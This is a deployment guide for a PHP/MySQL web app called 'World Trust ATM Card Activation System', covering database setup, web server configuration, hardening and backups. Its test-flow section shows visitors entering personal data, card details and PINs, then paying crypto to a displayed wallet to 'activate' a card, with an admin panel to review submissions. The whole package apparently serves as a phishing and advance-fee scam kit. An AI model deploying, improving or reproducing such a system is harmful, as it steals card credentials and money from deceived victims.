# Deployment Guide - World Trust ATM Card Activation System

## Prerequisites

Before deploying this application, ensure you have:

1. **PHP 7.4 or higher**
   - PDO extension enabled
   - PDO MySQL driver installed
   - Check with: `php -m | grep -E "pdo|pdo_mysql"`

2. **MySQL 5.7 or higher** (or MariaDB 10.2+)
   - Server running and accessible
   - Administrative access to create databases

3. **Web Server**
   - Apache 2.4+ with mod_rewrite OR
   - Nginx 1.18+ with PHP-FPM

4. **Optional: phpMyAdmin** for database management

## Installation Steps

### Step 1: Clone/Download the Repository

```bash
git clone https://github.com/mykael2000/worldtrustatm.git
cd worldtrustatm
```

### Step 2: Set Up MySQL Database

#### Option A: Using MySQL Command Line

```bash
# Log into MySQL
mysql -u root -p

# Import the schema (from MySQL prompt)
source database/schema.sql;

# Exit MySQL
exit;
```

#### Option B: Using MySQL from Shell

```bash
# Import directly
mysql -u root -p < database/schema.sql
```

#### Option C: Using phpMyAdmin

1. Open phpMyAdmin in browser
2. Go to "Import" tab
3. Choose file: `database/schema.sql`
4. Click "Go"

### Step 3: Configure Database Connection

Edit `config/database.php` with your MySQL credentials:

```php
<?php
define('DB_HOST', 'localhost');     // Your MySQL host
define('DB_NAME', 'worldtrust_atm'); // Database name
define('DB_USER', 'root');           // Your MySQL username
define('DB_PASS', '');               // Your MySQL password
?>
```

**Production Settings Example:**
```php
define('DB_HOST', 'localhost');
define('DB_NAME', 'worldtrust_atm');
define('DB_USER', 'wtatm_user');
define('DB_PASS', 'your_secure_password_here');
```

### Step 4: Set Permissions

```bash
# Make sure PHP can read all files
chmod -R 755 /path/to/worldtrustatm

# Ensure web server user can access files
chown -R www-data:www-data /path/to/worldtrustatm  # Ubuntu/Debian
# OR
chown -R apache:apache /path/to/worldtrustatm      # CentOS/RHEL
```

### Step 5: Configure Web Server

#### Apache Configuration

Create a virtual host file:

```apache
<VirtualHost *:80>
    ServerName worldtrustatm.local
    DocumentRoot /path/to/worldtrustatm
    
    <Directory /path/to/worldtrustatm>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    ErrorLog ${APACHE_LOG_DIR}/worldtrustatm_error.log
    CustomLog ${APACHE_LOG_DIR}/worldtrustatm_access.log combined
</VirtualHost>
```

Enable the site:
```bash
sudo a2ensite worldtrustatm.conf
sudo systemctl reload apache2
```

#### Nginx Configuration

```nginx
server {
    listen 80;
    server_name worldtrustatm.local;
    root /path/to/worldtrustatm;
    index index.php index.html;
    
    location / {
        try_files $uri $uri/ =404;
    }
    
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.1-fpm.sock;
    }
    
    location ~ /\.ht {
        deny all;
    }
}
```

Restart Nginx:
```bash
sudo systemctl restart nginx
```

### Step 6: Verify Installation

1. **Test Database Connection**
   ```bash
   php -r "
   require 'includes/database.php';
   \$db = get_db_connection();
   echo \$db ? 'Database connection successful!' : 'Connection failed!';
   "
   ```

2. **Check Tables**
   ```bash
   mysql -u root -p worldtrust_atm -e "SHOW TABLES;"
   ```
   
   You should see:
   - activation_requests
   - admin_users

3. **Access the Application**
   - User Interface: `http://worldtrustatm.local/`
   - Admin Panel: `http://worldtrustatm.local/admin/`

### Step 7: First-Time Setup

#### Change Default Admin Password

1. Log into admin panel with:
   - Username: `admin`
   - Password: `admin123`

2. Access MySQL to change password:
   ```sql
   USE worldtrust_atm;
   UPDATE admin_users 
   SET password_hash = '$2y$10$YourNewHashHere' 
   WHERE username = 'admin';
   ```
   
   Or create a new hash in PHP:
   ```bash
   php -r "echo password_hash('your_new_password', PASSWORD_DEFAULT);"
   ```

#### Optional: Create Additional Admin Users

```sql
INSERT INTO admin_users (username, password_hash, full_name, email, role)
VALUES (
    'newadmin',
    '$2y$10$YourHashHere',
    'Admin Name',
    'admin@example.com',
    'admin'
);
```

## Testing the Application

### Test User Flow

1. **Registration**
   - Go to homepage
   - Fill in all personal details
   - Submit form

2. **Card Display**
   - Wait for loading animation (4 seconds)
   - Verify message: "Your card is ready for activation!"
   - Click "Continue to PIN Setup"

3. **PIN Setup**
   - Enter card details and PIN
   - Submit form
   - **Watch 60-second loading animation**
   - Automatic redirect to payment page

4. **Payment**
   - Select payment method (BTC/ETH/USDT)
   - View wallet address and QR code
   - Click "I Have Completed the Payment"
   - Data should be saved to database

5. **Admin Review**
   - Login to admin panel
   - Verify statistics are correct
   - Check activation request appears in table
   - View details and verify payment info
   - Test payment verification

## Troubleshooting

### Database Connection Errors

**Error: "Database connection failed"**

Solutions:
1. Check MySQL is running: `sudo systemctl status mysql`
2. Verify credentials in `config/database.php`
3. Test connection: `mysql -u root -p worldtrust_atm`
4. Check PHP PDO MySQL extension: `php -m | grep pdo_mysql`

### PHP Errors

**Error: "Call to undefined function password_hash"**

Solution: Update to PHP 5.5 or higher

**Error: "Class 'PDO' not found"**

Solution: Enable PDO extension in php.ini

### Permission Errors

**Error: "Permission denied"**

Solution:
```bash
sudo chmod -R 755 /path/to/worldtrustatm
sudo chown -R www-data:www-data /path/to/worldtrustatm
```

### Loading Animation Not Showing

**Issue: PIN setup redirects immediately**

Check:
1. JavaScript is enabled in browser
2. No JavaScript errors in console (F12)
3. File `js/pin-setup.js` is accessible

## Security Checklist

Before going to production:

- [ ] Change default admin password
- [ ] Use HTTPS (SSL certificate)
- [ ] Update database credentials (strong password)
- [ ] Restrict database access to localhost only
- [ ] Set proper file permissions (755 for directories, 644 for files)
- [ ] Enable PHP error logging (disable display_errors)
- [ ] Set up regular database backups
- [ ] Review phpMyAdmin access (password protect)
- [ ] Configure firewall rules
- [ ] Set up rate limiting (optional)

## Production Optimization

### PHP Configuration (php.ini)

```ini
display_errors = Off
log_errors = On
error_log = /var/log/php/error.log
session.cookie_httponly = 1
session.cookie_secure = 1  ; If using HTTPS
```

### MySQL Optimization

```sql
# Create dedicated user with minimal privileges
CREATE USER 'wtatm_user'@'localhost' IDENTIFIED BY 'secure_password';
GRANT SELECT, INSERT, UPDATE ON worldtrust_atm.* TO 'wtatm_user'@'localhost';
FLUSH PRIVILEGES;
```

### Enable HTTPS

```bash
# Install Let's Encrypt (certbot)
sudo apt install certbot python3-certbot-apache

# Get certificate
sudo certbot --apache -d worldtrustatm.yourdomain.com
```

## Backup and Maintenance

### Automated Database Backup

Create a cron job:

```bash
# Edit crontab
crontab -e

# Add daily backup at 2 AM
0 2 * * * mysqldump -u root -p'password' worldtrust_atm > /backups/worldtrust_atm_$(date +\%Y\%m\%d).sql
```

### Monitor Application

- Check error logs regularly: `tail -f /var/log/apache2/error.log`
- Monitor database size: `SELECT table_schema, SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'worldtrust_atm';`
- Review activation requests periodically

## Support

For issues or questions:
- Check `IMPLEMENTATION_SUMMARY.md` for technical details
- Review `database/README.md` for database help
- Check PHP error logs
- Verify all requirements are met

## Environment Variables (Optional)

For added security, use environment variables:

```php
// config/database.php
define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
define('DB_NAME', getenv('DB_NAME') ?: 'worldtrust_atm');
define('DB_USER', getenv('DB_USER') ?: 'root');
define('DB_PASS', getenv('DB_PASS') ?: '');
```

Set in Apache/Nginx or .env file.

---

## Quick Start (Development)

For quick testing on localhost:

```bash
# 1. Import database
mysql -u root -p < database/schema.sql

# 2. Start PHP built-in server
php -S localhost:8000

# 3. Open browser
# http://localhost:8000/
# http://localhost:8000/admin/
```

Admin login: `admin` / `admin123`

---

**Deployment Date:** 2026-01-07  
**Version:** 1.0.0  
**Status:** Production Ready ✅
